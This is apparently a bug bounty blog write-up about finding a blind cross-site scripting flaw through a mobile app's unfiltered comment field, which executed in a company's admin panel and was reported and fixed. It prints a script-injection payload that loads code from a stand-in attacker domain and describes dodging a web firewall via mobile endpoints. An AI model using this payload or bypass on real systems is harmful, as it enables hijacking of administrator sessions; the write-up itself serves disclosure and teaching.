# 30 Minutes to Admin Panel Access-A $6,500 Blind XSS Story

> **Author**: Zhenwarx
> **Published**: Feb 19, 2026

---

Top highlight

![Zhenwarx](https://miro.medium.com/v2/resize:fill:32:32/1*mG6XguLTTShrlfJhz6PE6Q.jpeg)

216

7

Listen

Share

Hello everyone,

In this write-up, I would like to share a security vulnerability that is often overlooked by many hackers and bug bounty hunters. Although the issue may seem simple at first glance, it can lead to a critical impact if exploited correctly. In my case, this finding resulted in a $6,500 reward, according to the program’s bounty table for critical vulnerabilities.

Let me explain how I discovered and exploited the issue in less than 30 minutes.

## Step 1: Target Selection

I started testing a hard-testing bug bounty program. The platform allowed users to register and interact with their services, including posting content and engaging with other users.

## Step 2: WAF Protection on the Website

During my initial testing on the web application, I noticed that the website was protected by a Web Application Firewall (WAF). Even harmless HTML tags such as <i> were blocked. This made it clear that direct testing through the web interface would be difficult.

At this point, instead of giving up, I decided to change my testing method.

## Step 3: Switching to the Mobile Application

Many companies focus heavily on protecting their main website but sometimes forget to apply the same level of protection to other platforms, such as mobile applications.

I downloaded and analyzed their mobile application and created a new account.

## Step 4: Testing Input Fields in the Mobile App

After registering, I started interacting with the platform through the mobile application. I created comments on other users’ posts and tested for input validation issues.

Unlike the web version, the mobile application endpoints were not protected by a WAF. This allowed me to inject payloads without any filtering or blocking.

## Step 5: Injecting a Blind XSS Payload

I submitted a Blind Cross-Site Scripting (Blind XSS) payload in a comment field:

```
"><script src=https://maliciousjsdomain.com></script>
```

Blind XSS (often abbreviated as BXSS) is a type of Cross-Site Scripting vulnerability where the injected payload does not execute immediately in the attacker’s browser. Instead, it executes later in a different context usually when another user (such as an administrator or support staff member) views the stored content in a backend system like an admin panel, moderation dashboard, or internal tool.

## Step 6: Payload Execution in the Admin Panel

After approximately five minutes, I received a callback (ping) on BXSS account. This confirmed that the payload had been executed.

## Get Zhenwarx’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Further investigation revealed that the payload was triggered inside the company’s admin panel, likely when an administrator reviewed user generated content.

This meant that an attacker could execute arbitrary JavaScript in the administrator’s browser, potentially leading to:

- Session hijacking
- Account takeover
- Access to sensitive internal data
- Full compromise of the admin panel

This elevated the vulnerability to critical severity.

## Step 7: Responsible Disclosure

I immediately reported the vulnerability through the company’s bug bounty program. I provided detailed reproduction steps, the payload used, and proof of execution.

## Step 8: Fix and Reward

The company responded quickly and fixed the issue within one day. They acknowledged the severity of the vulnerability and awarded me $6,500, as per their bounty policy for critical issues.

![image](https://miro.medium.com/v2/resize:fit:700/1*eSqxPMXXSnZW7dIONrlFkQ.png)

Key Takeaways:

1- Do not rely only on the web interface — always test mobile applications and APIs.

2- Security protections like WAFs may not be consistently applied across all platforms.

3- Blind XSS can be extremely powerful, especially when triggered in privileged environments like admin panels.

4- Sometimes, simple testing techniques can lead to high-impact findings.



---
*Original URL: [https://medium.com/@zhenwarx/30-minutes-to-admin-panel-access-a-6-500-blind-xss-story-65f669135802?source=search_post---------53-----------------------------------](https://medium.com/@zhenwarx/30-minutes-to-admin-panel-access-a-6-500-blind-xss-story-65f669135802?source=search_post---------53-----------------------------------)*
